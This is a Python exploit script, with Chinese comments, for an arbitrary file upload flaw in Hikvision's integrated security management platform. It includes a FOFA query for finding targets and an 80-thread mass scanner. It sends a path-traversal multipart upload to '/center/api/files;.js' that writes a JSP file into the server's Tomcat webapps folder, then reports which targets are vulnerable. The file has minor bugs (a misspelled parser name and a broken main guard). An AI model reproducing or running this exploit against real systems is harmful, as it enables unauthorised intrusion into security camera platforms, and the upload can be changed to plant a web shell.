#fofa  app="HIKVISION-综合安防管理平台"
#导包
import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
              _                 _    __ _ _      
             | |               | |  / _(_) |     
  _   _ _ __ | | ___   __ _  __| | | |_ _| | ___ 
 | | | | '_ \| |/ _ \ / _` |/ _` | |  _| | |/ _ \
 | |_| | |_) | | (_) | (_| | (_| | | | | | |  __/
  \__,_| .__/|_|\___/ \__,_|\__,_| |_| |_|_|\___|
       | |                                       
       |_|                                       


"""
    print(test)


#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='HiKVISION 综合安防管理平台 files 任意文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
    

#poc函数
def poc(target):
    payload = '/center/api/files;.js '
    headers = { 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'
        
    }
    data = '------WebKitFormBoundaryxxmdzwoe\nContent-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp"\nContent-Type:image/jpeg\n\n<%out.println("pboyjnnrfipmplsukdeczudsefxmywex");%>\n------WebKitFormBoundaryxxmdzwoe--'
    res = requests.post(url=target + payload,headers=headers,data=data,verify=False)
    if res.status_code == 200 and 'data' in res.text:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')

#函数入口
if __name__ =='__main___':
    main()
